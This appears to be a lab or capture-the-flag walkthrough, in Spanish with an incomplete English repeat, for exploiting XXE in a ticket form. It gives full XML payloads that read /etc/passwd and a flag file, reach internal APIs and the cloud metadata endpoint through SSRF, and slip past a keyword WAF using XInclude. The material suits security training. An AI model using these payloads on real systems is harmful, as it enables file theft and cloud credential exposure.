Análisis de la vulnerabilidad

El formulario de tickets envía los datos al servidor como XML (Content-Type: application/xml). El parser del backend (lxml) tiene habilitada la resolución de entidades externas, lo que permite XXE.

Pasos de explotación con Burp Suite

  1. Abre Burp Suite y configura el proxy del navegador.
  2. Rellena el formulario de tickets con cualquier dato y pulsa "Enviar Ticket".
  3. En Burp → Proxy → HTTP history, localiza la petición POST /xxe/api.
  4. Haz clic derecho → Send to Repeater.
  5. En Repeater, sustituye el cuerpo XML completo por la inyección XXE y pulsa Send. La respuesta (JSON) aparece en el panel derecho de Repeater — la flag estará en el campo name del ticket y en el campo flag si el archivo extraído coincide.
  6. Easy: Sin filtro. Inyecta directamente una entidad XXE:

Leer /etc/passwd (Easy)

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<ticket>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <subject>test</subject>
  <message>test</message>
</ticket>

Leer la flag dedicada

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY xxe SYSTEM "file:///app/secret/xxe_flag.txt">
]>
<ticket>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <subject>test</subject>
  <message>test</message>
</ticket>

La flag dedicada del lab se incluirá en el campo flag de la respuesta JSON cuando el contenido extraído coincida con la flag del lab.

SSRF – Acceder a servicios internos

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<ticket>
  <name>&xxe;</name>
  <email>test@test.com</email>
  <subject>test</subject>
  <message>test</message>
</ticket>
  1. Medium: Bloquea el protocolo file://. Bypass con SSRF usando http://: 
    # Lee la API interna de usuarios
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY xxe SYSTEM "http://localhost:5000/api/users">
]>
<ticket>
  <name>&xxe;</name>
  <email>x</email>
  <subject>x</subject>
  <message>x</message>
</ticket>

# SSRF a metadatos cloud
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
    El filtro bloquea file:// pero no http:// — permite SSRF a servicios internos.
  2. Hard: El WAF bloquea DOCTYPE, ENTITY, SYSTEM y PUBLIC — el XXE clásico y XXEinjector (que genera un <!DOCTYPE> para OOB) fallan por diseño. El flag --phpfilter además solo funciona en apps PHP, no en Python/Flask.

    Bypass con XInclude — una especificación XML distinta que no contiene ninguna de las palabras bloqueadas: 
    <ticket xmlns:xi="http://www.w3.org/2001/XInclude">
  <name><xi:include href="file:///etc/passwd" parse="text"/></name>
  <email>test@test.com</email>
  <subject>test</subject>
  <message>test</message>
</ticket>
    El backend llama a lxml.XInclude() tras parsear → el elemento <xi:include> se sustituye por el contenido del archivo. El WAF no lo detecta porque ninguna de sus palabras clave aparece en el payload.

¿Por qué funciona?

  • El servidor parsea directamente el XML del cliente con lxml usando resolve_entities=True y load_dtd=True.
  • Esto permite definir entidades que el parser resuelve leyendo archivos locales (file://) o realizando peticiones HTTP (http://).
  • El valor expandido se refleja en la respuesta JSON → el atacante ve el contenido.

Cómo descubrirlo en un pentest real

  • Interceptar tráfico en Burp y buscar peticiones con Content-Type: application/xml o text/xml.
  • Cualquier endpoint que acepte XML es candidato a XXE.
  • Probar inyecciones de DOCTYPE en el body y observar si el servidor refleja, produce errores o cambia de comportamiento.

Vulnerability Analysis

The ticket form sends data to the server as XML (Content-Type: application/xml). The backend parser (lxml) has external entity resolution enabled, allowing XXE.

Exploitation Steps with Burp Suite

  1. Open Burp Suite and configure the browser proxy.
  2. Fill in the ticket form with any data and click "Submit Ticket".
  3. In Burp → Proxy → HTTP history, find the POST /xxe/api request.

  5. In Repeater, replace the entire XML body with your XXE injection and click Send. The response (JSON) appears in the right panel of Repeater — the flag will be in the name field of the ticket and in the flag field if the extracted file matches.

  • This allows defining entities that the parser resolves by reading local files (file://) or making HTTP requests (http://).
  • The expanded value is reflected in the JSON response → the attacker sees the contents.

  • Intercept traffic in Burp and look for requests with Content-Type: application/xml or text/xml.
  • Any endpoint accepting XML is a candidate for XXE.
  • Try injecting DOCTYPE in the body and observe if the server reflects, errors out, or changes behavior.
